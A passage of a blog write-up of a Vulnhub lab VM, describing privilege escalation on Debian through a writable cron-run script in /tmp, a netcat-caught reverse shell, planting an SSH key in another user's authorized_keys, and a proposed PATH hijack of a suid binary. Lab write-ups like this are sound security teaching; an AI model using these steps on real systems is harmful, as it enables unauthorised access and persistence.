+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="n">K</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="p">.</span><span class="n">gdb_history</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="mi">9</span><span class="n">K</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">38</span><span class="w"> </span><span class="n">overflow</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">   </span><span class="mi">19</span><span class="w"> </span><span class="n">mai</span><span class="w">   </span><span class="mi">10</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="n">peda</span><span class="o">-</span><span class="k">session</span><span class="o">-</span><span class="n">buff</span><span class="p">.</span><span class="n">txt</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">    </span><span class="mi">5</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="n">peda</span><span class="o">-</span><span class="k">session</span><span class="o">-</span><span class="n">overflow</span><span class="p">.</span><span class="n">txt</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w">  </span><span class="mi">675</span><span class="w"> </span><span class="n">avril</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="n">K</span><span class="w"> </span><span class="n">mai</span><span class="w">    </span><span class="mi">1</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span><span class="w"></span></span>
+<span class="code-line"><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Okay we got a program <code>buff</code> owned by root and and file <code>buff.c</code> readable by anybody but there is no suid, so no need to bother here.
+<code>martin@debian:/home/hadi$ ls -laRh /etc/cron.d</code> doesn't get us something useful but <code>cat /etc/crontab</code> seems usable:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">martin</span><span class="nv">@debian</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hadi</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span><span class="w"> </span></span>
+<span class="code-line"><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"><span class="n">SHELL</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"></span></span>
+<span class="code-line"><span class="k">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="nl">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="nl">bin</span><span class="p">:</span><span class="o">/</span><span class="nl">sbin</span><span class="p">:</span><span class="o">/</span><span class="nl">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nl">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="err">#</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="n">h</span><span class="w"> </span><span class="n">dom</span><span class="w"> </span><span class="n">mon</span><span class="w"> </span><span class="n">dow</span><span class="w"> </span><span class="k">user</span><span class="w">  </span><span class="n">command</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">17</span><span class="w"> </span><span class="o">*</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">hourly</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">25</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">daily</span><span class="w"> </span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">47</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">7</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">weekly</span><span class="w"> </span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">52</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">monthly</span><span class="w"> </span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="o">*/</span><span class="mi">5</span><span class="w">   </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">jimmy</span><span class="w">   </span><span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sekurity</span><span class="p">.</span><span class="n">py</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Of course the script launch by jimmy in <code>tmp</code> doesn't exist. We create one with a simple python reverse shell <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a>:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# nc -l -p 1234</span>
+<span class="code-line">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="code-line">$ id</span>
+<span class="code-line">uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We add our ssh key to be able to connect with ssh:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="nv">$</span> <span class="nv">cd</span> <span class="sr">/home/</span><span class="n">jimmy</span></span>
+<span class="code-line"><span class="nv">$</span> <span class="nv">mkdir</span> <span class="o">.</span><span class="n">ssh</span></span>
+<span class="code-line"><span class="nv">$</span> <span class="nv">cat</span> <span class="sr">/home/m</span><span class="n">artin</span><span class="sr">/.ssh/</span><span class="n">authorized_keys</span> <span class="o">&gt;</span> <span class="o">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>There is binary <code>networker</code> owned by root with an suid in our home directory (well jimmy's):</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">jimmy</span><span class="nv">@debian</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span></span>
+<span class="code-line"><span class="n">total</span><span class="w"> </span><span class="mi">36</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">nov</span><span class="p">.</span><span class="w">  </span><span class="mi">17</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">30</span><span class="w"> </span><span class="p">.</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="n">root</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">9</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">17</span><span class="w"> </span><span class="p">..</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="n">root</span><span class="w">    </span><span class="mi">16</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">9</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w">  </span><span class="mi">220</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">8</span><span class="w"> </span><span class="mi">21</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="mi">3515</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">8</span><span class="w"> </span><span class="mi">21</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rwsrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="n">root</span><span class="w">  </span><span class="mi">7496</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">9</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">00</span><span class="w"> </span><span class="n">networker</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w">  </span><span class="mi">675</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">8</span><span class="w"> </span><span class="mi">21</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">nov</span><span class="p">.</span><span class="w">  </span><span class="mi">17</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">31</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>It seems to give information about the network configuration, ping localhost and and echo "echo linux tool version 5":</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">jimmy</span><span class="err">@</span><span class="n">debian</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="o">./</span><span class="n">networker</span><span class="w"> </span></span>
+<span class="code-line"><span class="o">***</span><span class="w"> </span><span class="n">Networker</span><span class="w"> </span><span class="mf">2.0</span><span class="w"> </span><span class="o">***</span><span class="w"> </span></span>
+<span class="code-line"><span class="n">eth0</span><span class="w">      </span><span class="n">Link</span><span class="w"> </span><span class="n">encap</span><span class="p">:</span><span class="n">Ethernet</span><span class="w">  </span><span class="n">HWaddr</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="n">c4</span><span class="w">  </span></span>
+<span class="code-line"><span class="w">    </span><span class="n">inet</span><span class="w"> </span><span class="n">adr</span><span class="p">:</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.5</span><span class="w">  </span><span class="n">Bcast</span><span class="p">:</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.255</span><span class="w">  </span><span class="n">Masque</span><span class="p">:</span><span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">adr</span><span class="w"> </span><span class="n">inet6</span><span class="p">:</span><span class="w"> </span><span class="n">fe80</span><span class="p">::</span><span class="n">a00</span><span class="p">:</span><span class="mi">27</span><span class="n">ff</span><span class="p">:</span><span class="n">fe84</span><span class="p">:</span><span class="mi">43</span><span class="n">c4</span><span class="o">/</span><span class="mi">64</span><span class="w"> </span><span class="n">Scope</span><span class="p">:</span><span class="n">Lien</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">UP</span><span class="w"> </span><span class="n">BROADCAST</span><span class="w"> </span><span class="n">RUNNING</span><span class="w"> </span><span class="n">MULTICAST</span><span class="w">  </span><span class="n">MTU</span><span class="p">:</span><span class="mi">1500</span><span class="w">  </span><span class="n">Metric</span><span class="p">:</span><span class="mi">1</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">RX</span><span class="w"> </span><span class="n">packets</span><span class="p">:</span><span class="mi">3934</span><span class="w"> </span><span class="n">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">frame</span><span class="p">:</span><span class="mi">0</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">TX</span><span class="w"> </span><span class="n">packets</span><span class="p">:</span><span class="mi">2705</span><span class="w"> </span><span class="n">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">carrier</span><span class="p">:</span><span class="mi">0</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">collisions</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">lg</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">transmission</span><span class="p">:</span><span class="mi">1000</span><span class="w"> </span></span>
+<span class="code-line"><span class="w">    </span><span class="n">RX</span><span class="w"> </span><span class="n">bytes</span><span class="p">:</span><span class="mi">331724</span><span class="w"> </span><span class="p">(</span><span class="mf">323.9</span><span class="w"> </span><span class="n">KiB</span><span class="p">)</span><span class="w">  </span><span class="n">TX</span><span class="w"> </span><span class="n">bytes</span><span class="p">:</span><span class="mi">398743</span><span class="w"> </span><span class="p">(</span><span class="mf">389.3</span><span class="w"> </span><span class="n">KiB</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">Interruption</span><span class="p">:</span><span class="mi">9</span><span class="w"> </span><span class="n">Adresse</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">base</span><span class="p">:</span><span class="mh">0xd020</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">lo</span><span class="w">        </span><span class="n">Link</span><span class="w"> </span><span class="n">encap</span><span class="p">:</span><span class="n">Boucle</span><span class="w"> </span><span class="n">locale</span><span class="w">  </span></span>
+<span class="code-line"><span class="w">    </span><span class="n">inet</span><span class="w"> </span><span class="n">adr</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="w">  </span><span class="n">Masque</span><span class="p">:</span><span class="mf">255.0</span><span class="o">.</span><span class="mf">0.0</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">adr</span><span class="w"> </span><span class="n">inet6</span><span class="p">:</span><span class="w"> </span><span class="p">::</span><span class="mi">1</span><span class="o">/</span><span class="mi">128</span><span class="w"> </span><span class="n">Scope</span><span class="p">:</span><span class="n">Hôte</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">UP</span><span class="w"> </span><span class="n">LOOPBACK</span><span class="w"> </span><span class="n">RUNNING</span><span class="w">  </span><span class="n">MTU</span><span class="p">:</span><span class="mi">65536</span><span class="w">  </span><span class="n">Metric</span><span class="p">:</span><span class="mi">1</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">RX</span><span class="w"> </span><span class="n">packets</span><span class="p">:</span><span class="mi">6</span><span class="w"> </span><span class="n">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">frame</span><span class="p">:</span><span class="mi">0</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">TX</span><span class="w"> </span><span class="n">packets</span><span class="p">:</span><span class="mi">6</span><span class="w"> </span><span class="n">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">carrier</span><span class="p">:</span><span class="mi">0</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">collisions</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="n">lg</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">transmission</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span></span>
+<span class="code-line"><span class="w">    </span><span class="n">RX</span><span class="w"> </span><span class="n">bytes</span><span class="p">:</span><span class="mi">504</span><span class="w"> </span><span class="p">(</span><span class="mf">504.0</span><span class="w"> </span><span class="n">B</span><span class="p">)</span><span class="w">  </span><span class="n">TX</span><span class="w"> </span><span class="n">bytes</span><span class="p">:</span><span class="mi">504</span><span class="w"> </span><span class="p">(</span><span class="mf">504.0</span><span class="w"> </span><span class="n">B</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">PING</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="p">(</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">)</span><span class="w"> </span><span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">data</span><span class="o">.</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">64</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="p">(</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">):</span><span class="w"> </span><span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">ttl</span><span class="o">=</span><span class="mi">64</span><span class="w"> </span><span class="n">time</span><span class="o">=</span><span class="mf">0.012</span><span class="w"> </span><span class="n">ms</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="o">---</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="n">ping</span><span class="w"> </span><span class="n">statistics</span><span class="w"> </span><span class="o">---</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">1</span><span class="w"> </span><span class="n">packets</span><span class="w"> </span><span class="n">transmitted</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">received</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="o">%</span><span class="w"> </span><span class="n">packet</span><span class="w"> </span><span class="n">loss</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="mi">0</span><span class="n">ms</span><span class="w"></span></span>
+<span class="code-line"><span class="n">rtt</span><span class="w"> </span><span class="nb">min</span><span class="o">/</span><span class="n">avg</span><span class="o">/</span><span class="nb">max</span><span class="o">/</span><span class="n">mdev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0.012</span><span class="o">/</span><span class="mf">0.012</span><span class="o">/</span><span class="mf">0.012</span><span class="o">/</span><span class="mf">0.000</span><span class="w"> </span><span class="n">ms</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Done</span><span class="w"> </span></span>
+<span class="code-line"><span class="n">echo</span><span class="w"> </span><span class="n">linux</span><span class="w"> </span><span class="k">tool</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="mi">5</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Vous</span><span class="w"> </span><span class="n">avez</span><span class="w"> </span><span class="n">du</span><span class="w"> </span><span class="n">nouveau</span><span class="w"> </span><span class="n">courrier</span><span class="w"> </span><span class="n">dans</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">jimmy</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Getting the strings in the program give us the following:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">jimmy</span><span class="err">@</span><span class="n">debian</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">strings</span><span class="w"> </span><span class="n">networker</span><span class="w"> </span></span>
+<span class="code-line"><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"><span class="o">***</span><span class="w"> </span><span class="n">Networker</span><span class="w"> </span><span class="mf">2.0</span><span class="w"> </span><span class="o">***</span><span class="w"> </span></span>
+<span class="code-line"><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">ifconfig</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ping</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="mi">1</span><span class="w">  </span><span class="n">localhost</span><span class="w"> </span></span>
+<span class="code-line"><span class="n">Done</span><span class="w"> </span></span>
+<span class="code-line"><span class="n">echo</span><span class="w"> </span><span class="s1">&#39;echo linux tool version 5&#39;</span><span class="w"></span></span>
+<span class="code-line"><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>So <code>ping</code> and <code>ifconfig</code> seem to be loaded from an absolute path but not the <code>echo</code> command. We shall be able to
+make our own echo binary and change the path to execute our binary (a reverse shell) instead of echo.</p>
+<p>But the binary use the absolute path and we didn't achieve to be root.
+Let me know if you were able to get root from there (no bruteforce on the hadi user :D).</p>
+<p>Thanks to Hadi for the VM and thanks to vulnhub.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2017/11/vulnhub-bulldog-1.html"> Vulnhub, Bulldog: 1 </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2018/10/flare-on-challenge-2018.html"> Flare-on Challenge 2018 </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
